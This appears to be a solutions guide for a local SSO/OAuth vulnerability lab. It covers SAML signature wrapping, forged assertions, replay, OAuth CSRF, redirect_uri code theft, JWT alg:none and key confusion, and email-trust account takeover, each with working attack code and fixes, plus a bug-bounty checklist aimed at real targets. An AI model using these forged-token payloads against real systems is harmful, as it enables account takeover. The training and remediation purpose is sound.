# SSO Vulnerability Lab — Complete Solutions Guide

> **Elite Bug Bounty Edition** — CVEs, real H1 reports, and battle-tested methodology

---

## Lab Architecture

```
                    ┌─────────────────┐
                    │   SAML IdP      │
                    │  :8080          │
                    │  RSA-2048 sigs  │
                    └────────┬────────┘
                             │ SAML Assertions
              ┌──────────────┘
              │
   ┌──────────▼──────────┐      ┌──────────────────────┐
   │  Vulnerable SAML SP │      │  OAuth 2.0 Server    │
   │  :3000              │      │  :4000               │
   │  Lab 1 — XSW        │      │  JWT (RS256/none)    │
   │  Lab 2 — No Sig     │      │  JWKS endpoint       │
   │  Lab 3 — Replay     │      └──────────┬───────────┘
   └─────────────────────┘                 │
                                           │ Tokens / Codes
                               ┌───────────▼───────────┐
                               │  Vulnerable OAuth App  │
                               │  :5000                │
                               │  Lab 4 — CSRF         │
                               │  Lab 5 — redirect_uri │
                               │  Lab 6 — alg:none     │
                               │  Lab 7 — Email Trust  │
                               └───────────────────────┘
```

---

## Quick Start

```bash
git clone <repo>
cd sso-vuln-lab
chmod +x setup.sh
./setup.sh start
```

---

## Lab 1 — XML Signature Wrapping (XSW)

**Severity:** Critical | **CVSSv3:** 9.8  
**Category:** SAML Authentication Bypass  
**Impact:** Authenticate as any user, including admin, privilege escalation

### Background

XML Signature Wrapping (XSW) is one of the most impactful SAML vulnerabilities, affecting dozens of enterprise SSO implementations. The attack exploits the gap between *which element was signed* and *which element the SP reads user data from*.

The XML Digital Signature spec (`xmldsig`) allows signatures to be placed anywhere in a document and reference elements by ID. A vulnerable SP might verify the signature on element `#assertion_real` but then read user attributes from `root.findall('.//NameID')[0]` — which returns the first NameID found anywhere in the document, not necessarily the one in the signed element.

**Real-world impact:**
- [HackerOne #409237](https://hackerone.com/reports/409237) — SAML auth bypass via XSW, $10,000 bounty
- Affects: Shibboleth, OneLogin, SimpleSAMLphp, ADFS, and many custom implementations
- CVE-2017-11427 (OneLogin), CVE-2019-3719 (Dell), CVE-2020-5390 (Ubuntu SSO)

### Vulnerability Analysis

**Vulnerable code** (`vulnerable-saml-sp/app.py`, Lab 1):

```python
# STEP 1: Signature IS verified (returns the signed element)
signed_el, signed_id, err = verify_saml_signature(root, cert_pem)

# STEP 2: ⚠️  User data read from ROOT, not from signed_el!
user_data = extract_from_root(root)
# This calls: root.findall(".//saml:NameID", NS)[0]
# The [0] returns the FIRST NameID in the document tree
# Attacker injects a different NameID BEFORE the signed assertion

# SECURE fix:
# user_data = extract_from_element(signed_el)
```

The signed element `signed_el` is the legitimate assertion for `hacker@attacker.com`. But `root.findall('.//NameID')[0]` traverses the entire document and returns the first match — which an attacker can position before the signed assertion.

### Attack: XSW Type 2 (Wrapping Attack)

**Goal:** Authenticate as `alice@lab.local` (admin) using only `hacker@attacker.com` credentials

**Step 1 — Capture legitimate SAMLResponse:**
```bash
# Method A: Use attack script (automated)
python3 attacks/lab1_xsw.py

# Method B: Manual with Burp
# 1. Visit http://localhost:3000/lab1/login
# 2. In Burp, intercept POST to /lab1/acs
# 3. Base64-decode SAMLResponse field
# 4. Save XML for modification
```

**Step 2 — Decode and inspect the legitimate assertion:**
```python
import base64
from lxml import etree

xml = base64.b64decode(saml_response_b64)
root = etree.fromstring(xml)

# Find the signed assertion ID
assertion = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion')
real_id = assertion.get('ID')  # e.g., "_abc123def456"
print(f"Real assertion ID: {real_id}")
```

**Step 3 — Craft XSW payload:**

Normal SAMLResponse structure:
```xml
<samlp:Response>
  <saml:Assertion ID="_real">
    <saml:NameID>hacker@attacker.com</saml:NameID>
    <ds:Signature>
      <ds:Reference URI="#_real"/>
      <ds:SignatureValue>valid_sig...</ds:SignatureValue>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

XSW payload — evil assertion wraps the signed one:
```xml
<samlp:Response>
  <!-- Evil outer assertion — NOT signed, but parser sees it first -->
  <saml:Assertion ID="_evil">
    <saml:NameID>alice@lab.local</saml:NameID>      ← injected admin email
    <saml:Attribute Name="role">
      <saml:AttributeValue>admin</saml:AttributeValue>  ← injected role
    </saml:Attribute>
    
    <!-- Real signed assertion embedded inside evil one -->
    <saml:Assertion ID="_real">
      <saml:NameID>hacker@attacker.com</saml:NameID>
      <ds:Signature>
        <ds:Reference URI="#_real"/>                 ← SP verifies THIS
        <ds:SignatureValue>valid_sig...</ds:SignatureValue>
      </ds:Signature>
    </saml:Assertion>
  </saml:Assertion>
</samlp:Response>
```

SP's processing of XSW payload:
1. `verify_saml_signature(root)` → finds `<Signature>`, follows `Reference URI="#_real"` → finds inner `_real` assertion → verifies RSA-SHA256 → **PASSES**
2. `extract_from_root(root)` → `findall('.//NameID')[0]` → returns `alice@lab.local` from evil outer assertion
3. **Admin access granted!** 🎉

**Step 4 — Submit crafted payload:**
```python
import base64, requests

crafted_b64 = base64.b64encode(crafted_xml.encode()).decode()
session = requests.Session()
r = session.post("http://localhost:3000/lab1/acs", data={
    "SAMLResponse": crafted_b64,
    "RelayState": "lab1",
}, allow_redirects=True)

print(r.url)  # Should be /dashboard
```

**Step 5 — Using SAML Raider (Burp Extension):**
```
1. Install SAML Raider from BApp Store in Burp Suite
2. Intercept POST to /lab1/acs containing SAMLResponse
3. In the SAML Raider tab → select XSW Type 2
4. Click "Apply XSW" — it auto-crafts the wrapping payload
5. Forward the modified request
6. Observe: logged in as victim's identity
```

### All 8 XSW Variants (for testing)

| XSW Type | Signature Location | Element Read | Use Case |
|----------|-------------------|--------------|----------|
| XSW 1 | Inside root assertion (clone before) | response-level element | Simple |
| XSW 2 | **Inside evil wrapper** (wraps signed) | evil wrapper first | ✅ Lab 1 |
| XSW 3 | After real assertion | clone before original | |
| XSW 4 | Wrapping type 3 | nested clone | |
| XSW 5 | Extensions element | extensions | |
| XSW 6 | Extensions (wrapped) | nested extensions | |
| XSW 7 | Signed element in extensions | extensions variant | |
| XSW 8 | Object element | complex nesting | |

### Remediation

```python
# ✅ SECURE: Read data from the VERIFIED element only
signed_el, signed_id, err = verify_saml_signature(root, cert_pem)
if err:
    abort(401)

# Read attributes from signed_el, not from root
user_data = extract_from_element(signed_el)
# This calls signed_el.find('.//saml:NameID') — not root!
```

---

## Lab 2 — SAML Signature Not Verified

**Severity:** Critical | **CVSSv3:** 10.0  
**Impact:** Login as any user, any role — zero cryptography required

### Background

Some SAML implementations parse and trust assertion content without performing any signature verification. This is a catastrophic misconfiguration — anyone can craft an arbitrary SAML assertion and authenticate as any identity.

Real-world causes:
- Skipping verification in development, forgetting to re-enable
- Conditional verification that can be bypassed
- Trusting SP-side validation already performed
- Library misconfiguration (`wantAssertionsSigned = false`)

### Vulnerability Analysis

```python
# VULNERABLE Lab 2 code:
xml_bytes = decode_saml_response(b64_resp)
root = etree.fromstring(xml_bytes)

# ⚠️  NO SIGNATURE VERIFICATION AT ALL
# We just parse and trust:
user_data = extract_from_root(root)

# SECURE fix:
# signed_el, signed_id, err = verify_saml_signature(root, cert_pem)
# if err: return "Signature error", 401
# user_data = extract_from_element(signed_el)
```

### Attack: Forge Arbitrary SAML Assertion

**Step 1 — Craft a fake SAML response:**
```python
import base64, uuid

fake_xml = """<samlp:Response
  xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="_fake" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_assert" Version="2.0">
    <saml:Subject>
      <saml:NameID>alice@lab.local</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
    <!-- NO SIGNATURE — SP accepts this anyway -->
  </saml:Assertion>
</samlp:Response>"""

forged_b64 = base64.b64encode(fake_xml.encode()).decode()
```

**Step 2 — Submit forged assertion:**
```bash
# Using attack script
python3 attacks/lab2_sig_bypass.py alice@lab.local admin

# Manual curl
curl -s -X POST http://localhost:3000/lab2/acs \
  -d "SAMLResponse=$(python3 -c "import base64; print(base64.b64encode(open('forged.xml','rb').read()).decode())")" \
  -L -c cookies.txt
```

**Step 3 — Burp manual modification:**
```
1. Intercept any SAMLResponse at /lab2/acs
2. Base64-decode the SAMLResponse
3. Edit NameID to: alice@lab.local
4. Edit role attribute to: admin
5. DELETE the entire <ds:Signature> block
6. Re-base64 encode
7. Forward — authenticated as admin!
```

### Remediation

```python
# Always verify before trusting
def process_saml(xml_bytes):
    root = etree.fromstring(xml_bytes)
    
    # Required: verify signature
    cert_pem = get_idp_cert()
    signed_el, signed_id, err = verify_saml_signature(root, cert_pem)
    if err:
        raise AuthError(f"Invalid signature: {err}")
    
    # Required: validate issuer
    issuer = signed_el.findtext('.//saml:Issuer', namespaces=NS)
    if issuer != EXPECTED_IDP_ENTITY_ID:
        raise AuthError("Unknown issuer")
    
    # Required: validate audience
    audience = signed_el.findtext('.//saml:Audience', namespaces=NS)
    if audience != SP_ENTITY_ID:
        raise AuthError("Invalid audience")
    
    return extract_from_element(signed_el)
```

---

## Lab 3 — SAML Assertion Replay

**Severity:** High | **CVSSv3:** 8.1  
**Impact:** Re-authenticate as victim using a previously captured assertion

### Background

SAML assertions are time-limited credentials. Without replay protection, a stolen assertion can be replayed long after its intended use — even after its `NotOnOrAfter` expiry has passed.

Assertions can be captured via:
- Network sniffing (HTTP, no TLS)
- Browser history / logs (SAML is often passed as a POST body)
- XSS exfiltration
- Server-side log injection
- MITM on HTTP-POST binding

### Vulnerability Analysis

```python
# VULNERABLE Lab 3 code:
signed_el, signed_id, err = verify_saml_signature(root, cert_pem)

# ⚠️  NotOnOrAfter parsed but NEVER enforced
expiry_el = root.find(".//saml:SubjectConfirmationData", NS)
not_after = expiry_el.get("NotOnOrAfter")
# ↑ We read it... and do nothing with it

# ⚠️  signed_id never added to SEEN_ASSERTION_IDS set

# SECURE fix:
# from datetime import datetime, timezone
# now = datetime.now(timezone.utc)
# expiry = datetime.fromisoformat(not_after.replace('Z','+00:00'))
# if now > expiry:
#     return "Assertion expired", 401
# if signed_id in SEEN_ASSERTION_IDS:
#     return "Assertion already used", 401
# SEEN_ASSERTION_IDS.add(signed_id)
```

### Attack: Capture and Replay

**Step 1 — Capture a valid assertion:**

Option A: Burp Suite (HTTP history):
```
1. Log in via http://localhost:3000/lab3/login
2. In Burp HTTP history: find POST to /lab3/acs
3. Right-click → Copy to file → save SAMLResponse value
4. This is your replayable token
```

Option B: Network capture with tcpdump:
```bash
sudo tcpdump -i lo -A -s 0 'tcp port 3000 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
# Parse SAMLResponse= from POST body
```

Option C: Attack script (captures automatically):
```bash
python3 attacks/lab3_replay.py victim@lab.local victim123
```

**Step 2 — Wait for assertion to "expire":**
```bash
# Assertions have NotOnOrAfter = now + 10 minutes
# In a real attack, wait 10+ minutes, then replay
# Lab 3 doesn't enforce this — replay works immediately too
sleep 600  # Wait for NotOnOrAfter to pass
```

**Step 3 — Replay the captured assertion:**
```python
import requests

# saml_b64 = <base64 SAMLResponse captured in Step 1>
session = requests.Session()
r = session.post("http://localhost:3000/lab3/acs", data={
    "SAMLResponse": saml_b64,
    "RelayState": "replay",
}, allow_redirects=True)
print(r.url)  # /dashboard — replayed successfully!

# Replay it again
r2 = session.post("http://localhost:3000/lab3/acs", data={
    "SAMLResponse": saml_b64,
}, allow_redirects=True)
print(r2.url)  # Still /dashboard — unlimited replays!
```

### Remediation

```python
import redis
from datetime import datetime, timezone

# Use Redis (or database) for distributed assertion ID tracking
redis_client = redis.Redis()

def process_saml_secure(xml_bytes):
    root = etree.fromstring(xml_bytes)
    signed_el, signed_id, err = verify_saml_signature(root, cert_pem)
    if err:
        raise AuthError(err)
    
    # 1. Check NotOnOrAfter
    scd = signed_el.find('.//saml:SubjectConfirmationData', NS)
    not_after_str = scd.get('NotOnOrAfter')
    not_after = datetime.fromisoformat(not_after_str.replace('Z','+00:00'))
    if datetime.now(timezone.utc) > not_after:
        raise AuthError("Assertion expired")
    
    # 2. Check for replay (TTL = expiry - now)
    ttl = int((not_after - datetime.now(timezone.utc)).total_seconds())
    key = f"saml:used:{signed_id}"
    if redis_client.exists(key):
        raise AuthError("Assertion already consumed — replay detected")
    redis_client.setex(key, ttl + 60, "1")  # Extra 60s buffer
    
    return extract_from_element(signed_el)
```

---

## Lab 4 — OAuth CSRF (Missing State Parameter)

**Severity:** High | **CVSSv3:** 8.8  
**Impact:** Force victim's browser to complete attacker's OAuth flow → account takeover

### Background

The OAuth `state` parameter is a CSRF token for the authorization flow. When absent, an attacker can:
1. Start an OAuth flow (gets an authorization URL)
2. Send that URL to a logged-in victim
3. Victim's browser follows the URL and completes the flow with the attacker's identity
4. In account-linking apps, this maps the attacker's IdP identity to the victim's app session

**Real bounties paid:**
- Slack OAuth CSRF: $1,500 ([H1 #137223](https://hackerone.com/reports/137223))
- Twitter: $700 ([H1 #7914](https://hackerone.com/reports/7914))
- Facebook: reported multiple times, massive impact

### Vulnerability Analysis

```python
# VULNERABLE Lab 4 code (/lab4/login):
params = {
    "response_type": "code",
    "client_id": CLIENT_ID,
    "redirect_uri": redirect_uri,
    "scope": "openid email profile",
    # state= ← MISSING (the vulnerability)
}

# VULNERABLE callback (/lab4/callback):
code = request.args.get("code")
# No state check at all — just exchange the code
tokens = exchange_code(code, redirect_uri)
```

### Attack: CSRF Account Linking Takeover

**Scenario:** App allows users to link their social login. Victim has a local account. Attacker links *their own* IdP identity to victim's session.

**Step 1 — Attacker starts OAuth flow but doesn't complete it:**
```python
import requests

# Attacker's session
attacker_session = requests.Session()

# Start auth flow — this generates an auth URL
r = attacker_session.get("http://localhost:5000/lab4/login",
                          allow_redirects=False)

# Get the authorization URL the client built
auth_url = r.headers.get("Location", "")
# auth_url = "http://localhost:4000/oauth/authorize?client_id=...&redirect_uri=..."
# NO state parameter in this URL!
print(f"CSRF URL: {auth_url}")
```

**Step 2 — Attacker sends URL to victim:**
```html
<!-- Phishing email -->
<a href="http://localhost:4000/oauth/authorize?client_id=vulnerable-client&redirect_uri=http://localhost:5000/lab4/callback&scope=openid">
  Click here to verify your account
</a>

<!-- Or silent CSRF via img tag on attacker's website -->
<img src="http://localhost:4000/oauth/authorize?..." width=0 height=0>

<!-- Or JavaScript redirect -->
<script>window.location='http://localhost:4000/oauth/authorize?...'</script>
```

**Step 3 — Victim clicks, attacker's identity linked:**
```
1. Victim clicks link (is already logged into IdP as victim@lab.local)
2. OAuth server authenticates victim (since victim is logged in)
   BUT wait — the code returned goes back to the app and the
   app logs in whoever the code is for — in THIS case the
   ATTACKER's identity (since attacker started the flow)
   
   Actually: victim is logged in to IdP, so IdP gives code for VICTIM
   App links VICTIM's OAuth identity to VICTIM's session (no real takeover here)
   
   REAL takeover scenario (account linking):
   - Attacker logs in at IdP as attacker@evil.com
   - Attacker starts account-linking flow, gets halfway
   - Sends the callback URL with attacker's code to victim
   - Victim's browser hits callback → app links attacker's identity to VICTIM's account
   - Now attacker can login via SSO and access victim's account!
```

**Automated PoC:**
```bash
python3 attacks/lab4_oauth_csrf.py

# Then visit the CSRF PoC endpoint:
curl http://localhost:5000/lab4/csrf_poc
```

### Remediation

```python
import secrets

# ✅ Generate and store state
@app.route('/login')
def login():
    state = secrets.token_urlsafe(32)
    session['oauth_state'] = state
    
    params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "scope": "openid email profile",
        "state": state,     # ← Include state
    }
    return redirect(f"{AUTH_ENDPOINT}?{urlencode(params)}")

# ✅ Verify state on callback
@app.route('/callback')
def callback():
    returned_state = request.args.get('state', '')
    stored_state   = session.pop('oauth_state', None)  # pop = one-time use
    
    if not stored_state or returned_state != stored_state:
        abort(403, "CSRF detected — state mismatch")
    
    code = request.args.get('code')
    # ... proceed with code exchange
```

---

## Lab 5 — OAuth Open redirect_uri Bypass

**Severity:** Critical | **CVSSv3:** 9.3  
**Impact:** Authorization code stolen → full account takeover

### Background

The `redirect_uri` parameter tells the OAuth server where to send the authorization code after user consent. If:
1. The **client** accepts redirect_uri from user input (instead of hardcoding it), OR
2. The **server** does prefix/partial matching instead of exact matching

Then an attacker can redirect the code to their own server.

**Bypasses by server validation type:**

| Server Validation | Bypass Technique |
|------------------|-----------------|
| No validation | `http://attacker.com/steal` |
| Prefix match | `http://legit.com.attacker.com/` |
| Contains match | `http://attacker.com/?x=http://legit.com` |
| Path prefix | `http://legit.com/../../../attacker.com/` |
| Suffix match | `http://notlegit.com/legit.com/` |
| Regex loose | `http://legit.com%40attacker.com/` |
| Redirect chain | `http://legit.com/redirect?url=http://attacker.com` |

### Attack: Code Theft via Injected redirect_uri

**Step 1 — Identify the vulnerability:**
```bash
# Check if client accepts redirect_uri parameter
curl -v "http://localhost:5000/lab5/login?redirect_uri=http://attacker.com" -L

# Check if auth URL contains the injected redirect_uri
# Look in Burp for: redirect_uri=http://attacker.com
```

**Step 2 — Craft the attack URL:**
```
http://localhost:5000/lab5/login?redirect_uri=http://localhost:5000/lab5/steal
```

When victim visits this URL:
1. Client starts OAuth with `redirect_uri=http://localhost:5000/lab5/steal`
2. Victim authorizes → server redirects code to `/lab5/steal`
3. Attacker's endpoint captures the code

**Step 3 — Exchange stolen code:**
```python
import requests

stolen_code = "code_captured_from_steal_endpoint"

r = requests.post("http://localhost:4000/oauth/token", data={
    "grant_type":    "authorization_code",
    "code":          stolen_code,
    "redirect_uri":  "http://localhost:5000/lab5/steal",
    "client_id":     "vulnerable-client",
    "client_secret": "client-secret-abc123",
})
tokens = r.json()
print(f"Access token: {tokens['access_token']}")
print(f"ID token: {tokens['id_token']}")
```

**Step 4 — Get victim's user info:**
```python
r = requests.get("http://localhost:4000/oauth/userinfo",
    headers={"Authorization": f"Bearer {tokens['access_token']}"})
print(r.json())  # Victim's profile!
```

**Automated PoC:**
```bash
python3 attacks/lab5_redirect_uri.py

# Visit the built-in steal endpoint (simulates attacker server)
# http://localhost:5000/lab5/steal
```

### Remediation

```python
# ✅ Client: NEVER accept redirect_uri from user input
# Hardcode it
REDIRECT_URI = "http://localhost:5000/callback"

@app.route('/login')
def login():
    params = {
        "redirect_uri": REDIRECT_URI,  # ← Hardcoded, not from request.args
        ...
    }

# ✅ Server: Exact match validation only
REGISTERED_URIS = {
    "vulnerable-client": [
        "http://localhost:5000/lab4/callback",
        "http://localhost:5000/lab5/callback",
    ]
}

def validate_redirect_uri(client_id, redirect_uri):
    allowed = REGISTERED_URIS.get(client_id, [])
    if redirect_uri not in allowed:  # Exact match — not startswith, not regex
        raise OAuth2Error("invalid_redirect_uri")
```

---

## Lab 6 — JWT alg:none Attack

**Severity:** Critical | **CVSSv3:** 9.8  
**Impact:** Forge any identity without knowing the server's private key

### Background

JSON Web Tokens (JWT) specify their signing algorithm in the header. The JWT spec defines `"alg":"none"` for unsigned tokens. Many implementations naively trust the `alg` field from the token header — allowing attackers to switch from `RS256` to `none` and strip the signature entirely.

**Real CVEs:**
- CVE-2015-9235 (jsonwebtoken npm — millions of downloads)
- CVE-2016-5431 (python-jose)
- CVE-2018-0114 (Cisco node-jose)

### Attack Variants

**Technique A — alg:none (primary attack):**
```python
import base64, json, time

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {
    "iss": "http://localhost:4000",
    "sub": "forged",
    "aud": "vulnerable-client",
    "email": "alice@lab.local",
    "email_verified": True,
    "role": "admin",
    "name": "Forged Admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}

h = b64url(json.dumps(header, separators=(',',':')))
p = b64url(json.dumps(payload, separators=(',',':')))

forged_token = f"{h}.{p}."   # Empty signature!

print(forged_token)
```

**Technique B — Algorithm confusion (RS256 → HS256):**
```python
import hmac, hashlib

# Step 1: Get server's RSA public key from JWKS
import requests
jwks = requests.get("http://localhost:4000/oauth/jwks").json()
# ... extract public key PEM ...

# Step 2: Sign with HS256 using the PUBLIC KEY as HMAC secret
# (Many libraries verify HS256 using the "signing key"
#  which is the RSA public key when switching algorithms)
header  = {"alg": "HS256", "typ": "JWT"}
payload = {"email": "alice@lab.local", "role": "admin", ...}

h = b64url(json.dumps(header, separators=(',',':')))
p = b64url(json.dumps(payload, separators=(',',':')))

signing_input = f"{h}.{p}".encode()
sig = hmac.new(public_key_pem_bytes, signing_input, hashlib.sha256).digest()
token = f"{h}.{p}.{b64url(sig)}"
```

**Submit forged token:**
```bash
# Test against userinfo endpoint
curl -H "Authorization: Bearer <FORGED_TOKEN>" \
     http://localhost:4000/oauth/userinfo

# Use forge endpoint in lab
curl "http://localhost:5000/lab6/forge?email=alice@lab.local&role=admin"

# Run full attack script
python3 attacks/lab6_jwt_none.py alice@lab.local admin
```

### Vulnerable Code Analysis

```python
# ⚠️  VULNERABLE (Lab 6 client):
claims = jwt.decode(id_token,
                    options={"verify_signature": False,   # No sig check
                             "verify_exp": False},
                    algorithms=["RS256","none","HS256"])  # Allows none!

# ⚠️  VULNERABLE server (oauth-server/server.py):
if VULN_ACCEPT_NONE_ALG:
    payload = jwt.decode(token, options={"verify_signature": False},
                         algorithms=["none","RS256","HS256"])
```

### Remediation

```python
from cryptography.hazmat.primitives import serialization
import jwt

# ✅ Load public key
with open("public_key.pem", "rb") as f:
    public_key = serialization.load_pem_public_key(f.read())

# ✅ Strict verification — explicit algorithm whitelist
try:
    claims = jwt.decode(
        token,
        public_key,
        algorithms=["RS256"],          # Whitelist ONLY RS256
        audience=CLIENT_ID,
        issuer=EXPECTED_ISSUER,
        options={"verify_exp": True},  # Enforce expiry
    )
except jwt.InvalidAlgorithmError:
    abort(401, "Algorithm not allowed")
except jwt.ExpiredSignatureError:
    abort(401, "Token expired")
except jwt.InvalidTokenError as e:
    abort(401, f"Invalid token: {e}")
```

---

## Lab 7 — SSO Account Takeover via Email Trust

**Severity:** Critical | **CVSSv3:** 9.8  
**Impact:** Take over any existing user account using their email address

### Background

This is arguably the **most commonly found high-impact SSO bug** in bug bounty programs. Applications that use SSO for authentication often need to link SSO identities to existing local accounts. The naive approach is:

> "If the IdP says the user's email is X, find local account with email X and grant access."

The vulnerability arises when:
1. The IdP doesn't verify email ownership before issuing tokens
2. The app doesn't check `email_verified` claim
3. The app trusts email across different IdPs without confirmation

**Massive real-world bounties:**
- $20,000 — [H1 #1074047](https://hackerone.com/reports/1074047) — GitLab ATO via SSO email
- $15,000 — HackerOne's own platform via SSO trust bug
- $10,000 — Uber SSO account takeover
- $8,500 — [H1 #291531](https://hackerone.com/reports/291531) — GitHub ATO
- $5,000 — [H1 #1416530](https://hackerone.com/reports/1416530) — Shopify

### Vulnerability Analysis

```python
# ⚠️  VULNERABLE (Lab 7 callback):
idp_email          = userinfo.get("email","").lower()
idp_email_verified = userinfo.get("email_verified", False)

# Find existing account by email — NO verification check
existing_account = APP_USERS.get(idp_email)

if existing_account:
    role = existing_account["role"]
    # ← email_verified is IGNORED, attacker gets victim's role

# SECURE fix:
# if not idp_email_verified:
#     send_confirmation_email(idp_email)
#     return "Please confirm your email address", 403
```

### Attack: Steal Victim's Account via SSO

**Prerequisites:** Attacker needs an IdP account where they can set their email to the victim's address (without real ownership verification).

**In this lab:** `hacker@attacker.com` has `email_verified=False` — the app accepts it anyway.

**Step 1 — Identify the target account:**
```
Target app has: victim@lab.local (existing user, role: user)
IdP account:    hacker@attacker.com (email_verified=False)
```

**Step 2 — Initiate SSO login as hacker:**
```bash
# Visit the vulnerable lab
curl -c cookies.txt -b cookies.txt -L \
     "http://localhost:5000/lab7/login"

# Follow OAuth flow, authenticate as hacker@attacker.com
# App receives: email=hacker@attacker.com, email_verified=False
```

**Step 3 — Observe account takeover:**

The app calls:
```python
existing_account = APP_USERS.get("hacker@attacker.com")  # None — not in app DB
# Falls through to: role = userinfo.get("role", "user")
# Logs in as hacker, not as a privileged user
```

**For the real takeover** (in a real-world app where IdP allows registration with any email):
```python
# Attack steps in a real app:
# 1. Register on IdP with victim@example.com
# 2. IdP doesn't verify email — issues tokens with email=victim@example.com, email_verified=false
# 3. Login to target app via SSO
# 4. App finds existing account for victim@example.com
# 5. Links attacker's IdP identity → full ATO

# Evidence to include in H1 report:
# - IdP registration flow (show no email verification)
# - Token from IdP showing email_verified=false
# - Successful login as victim's account
```

**Run automated attack:**
```bash
python3 attacks/lab7_account_takeover.py
```

### Testing Checklist for Real Targets

```
☐ Register with target's email on SSO provider (Google, GitHub, etc.)
☐ Check if IdP requires email verification before allowing login
☐ Inspect ID token / userinfo for email_verified claim
☐ Test: if email_verified=false, does app still link accounts?
☐ Test: does app send confirmation email before linking?
☐ Test: can you link multiple SSO providers to one account by email?
☐ Test: does email change at IdP affect app account linkage?
☐ Try with "Sign in with Google" → register Google account with target's email
```

### Remediation

```python
@app.route('/callback')
def callback():
    code = request.args.get('code')
    tokens = exchange_code(code)
    
    # Get IdP's claims
    id_token_claims = verify_id_token(tokens['id_token'])
    email           = id_token_claims.get('email', '').lower()
    email_verified  = id_token_claims.get('email_verified', False)
    idp_sub         = id_token_claims.get('sub')  # Stable unique ID
    
    # ✅ SECURE: Require email to be verified by IdP
    if not email_verified:
        session['pending_sso_link'] = {'email': email, 'sub': idp_sub}
        return send_verification_email(email)
    
    # ✅ Use 'sub' as the primary identifier, not email
    existing = db.query("SELECT * FROM users WHERE idp_sub = ?", idp_sub)
    if not existing:
        # First time: require explicit account linking with confirmation
        existing = db.query("SELECT * FROM users WHERE email = ?", email)
        if existing:
            # Don't auto-link — send confirmation to the existing account's email
            send_link_confirmation_email(email, idp_sub)
            return "Please confirm account linking in your email"
```

---

## Full Bug Bounty Methodology: SSO/SAML/OIDC Testing

### Recon Phase

```bash
# 1. Discover SSO endpoints
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api.txt \
     -mc 200,301,302 -fc 404

# Common paths:
# /saml/metadata, /saml/sso, /saml/acs, /sso, /auth/saml
# /oauth/authorize, /.well-known/openid-configuration, /oauth/token
# /api/auth, /login/sso, /login/oauth

# 2. Identify SSO provider
curl https://target.com/.well-known/openid-configuration
curl https://target.com/saml/metadata

# 3. Check SAML metadata for weak configuration
# Look for: WantAuthnRequestsSigned="false"
#           WantAssertionsSigned="false"

# 4. Enumerate JWT algorithms
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0." \
     https://target.com/api/me
```

### SAML Testing Tools

```bash
# SAML Raider (Burp Extension) — best XSW tool
# Install from BApp Store

# saml-attack-tool (Python)
pip install saml-attack-tool
saml-attack --url https://target.com/saml/acs --type xsw2

# SAML fuzzing with BURP intruder
# Positions: §SAMLResponse§
# Payloads: XSW variants 1-8

# Decode SAML responses quickly
echo "<SAML_BASE64>" | base64 -d | xmllint --format -
```

### JWT Testing Tools

```bash
# jwt_tool — the definitive JWT testing tool
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <TOKEN> -T        # Tamper mode
python3 jwt_tool.py <TOKEN> -X a      # Test alg:none
python3 jwt_tool.py <TOKEN> -X s      # Sign with key
python3 jwt_tool.py <TOKEN> -pk server_public.pem -X k  # Key confusion

# hashcat for HS256 bruteforce
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt

# PyJWT manual
python3 -c "
import jwt, json, base64
# Decode without verification
parts = '<TOKEN>'.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
print(payload)
"
```

### OAuth Testing Checklist

```
CSRF (State):
  ☐ Missing state parameter → CSRF possible
  ☐ Predictable/reused state → CSRF possible
  ☐ State not verified on callback

redirect_uri:
  ☐ Try: redirect_uri=http://attacker.com
  ☐ Try: redirect_uri=https://legitimate.com.attacker.com
  ☐ Try: redirect_uri=https://legitimate.com/../../../attacker.com
  ☐ Try: redirect_uri=https://legitimate.com?foo=bar@attacker.com
  ☐ Try URL encoding, double encoding
  ☐ Check if server uses prefix/contains matching

Token security:
  ☐ JWT alg:none
  ☐ JWT alg confusion (RS256 → HS256)
  ☐ JWT kid injection (manipulate key ID)
  ☐ Short-lived tokens vs long-lived?
  ☐ Token revocation endpoint?

Authorization code:
  ☐ Code reuse (replay)
  ☐ Code leakage via Referer header
  ☐ PKCE: is it enforced?
  ☐ Code lifetime (>60 seconds is a finding)

Account linking:
  ☐ email_verified check bypassed
  ☐ Can link any SSO to existing account by email?
  ☐ Confirmation email sent before linking?
  ☐ sub vs email as primary identifier
```

### H1 Report Template

```markdown
## Summary
[One sentence: what vulnerability, what impact]

## Steps to Reproduce
1. Visit https://target.com/login
2. Start SSO flow
3. [...]
4. Observe: authenticated as victim@target.com

## Impact
**Severity:** Critical
- Full account takeover of any user
- Admin account takeover
- No victim interaction required [if applicable]

## Proof of Concept
[Screenshot or video]
[Code snippet]

## Root Cause
[Technical explanation of what code is vulnerable]

## Remediation
[Specific code-level fix]

## References
- https://portswigger.net/web-security/oauth
- https://research.aurainfosec.io/bypassing-saml20-SSO/
- CVE-XXXX-XXXXX
```

---

## Quick Reference: Service Ports & Credentials

| Service | Port | URL |
|---------|------|-----|
| SAML IdP | 8080 | http://localhost:8080 |
| Vulnerable SAML SP | 3000 | http://localhost:3000 |
| OAuth/OIDC Server | 4000 | http://localhost:4000 |
| OAuth Client (Labs 4-7) | 5000 | http://localhost:5000 |

| Account | Password | Role | Notes |
|---------|----------|------|-------|
| alice@lab.local | alice123 | admin | High-value target |
| bob@lab.local | bob123 | user | Normal user |
| victim@lab.local | victim123 | user | email_verified=true |
| hacker@attacker.com | hack123 | user | email_verified=false |

| Key Endpoint | Purpose |
